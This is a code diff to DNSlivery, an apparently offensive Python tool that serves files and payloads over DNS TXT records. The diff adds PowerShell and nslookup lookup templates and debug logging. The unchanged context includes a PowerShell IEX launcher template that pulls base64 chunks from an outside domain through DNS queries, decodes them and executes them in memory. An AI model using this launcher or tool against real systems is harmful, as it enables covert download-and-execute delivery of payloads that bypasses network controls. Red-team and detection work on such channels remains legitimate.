@@ -9,7 +9,7 @@ import base64
 from scapy.all import *
 
 banner = """
-DNSlivery - Easy files and payloads delivery over DNS
+DNSlivery - Easy files and payloads delivery over DNS via TXT records
 """
 
 def log(message, msg_type=''):
@@ -131,6 +131,10 @@ if __name__ == '__main__':
         break
 
     # launcher and stagers template definition
+
+    lookup_template_pwsh = "Resolve-DnsName -ty TXT -na \"%s.%s\" | Select-Object -Exp Strings"
+    lookup_template_nslookup_win = "nslookup -q=TXT %s.%s %s"
+
     launcher_template = 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na "%s.%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}))))'
 
     stager_templates = {
@@ -176,6 +180,10 @@ if __name__ == '__main__':
 
         # display file ready for delivery
         log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))
+
+        # Print lookup template
+        log('Lookup template (Resolve-DNSName): %s' % (lookup_template_pwsh % (filenames[name], args.domain)), 'debug')
+        log('Lookup template (nslookup): %s' % (lookup_template_nslookup_win % (filenames[name], args.domain, args.nameserver)), 'debug')
 
     # register signal handler
     signal.signal(signal.SIGINT, signal_handler)
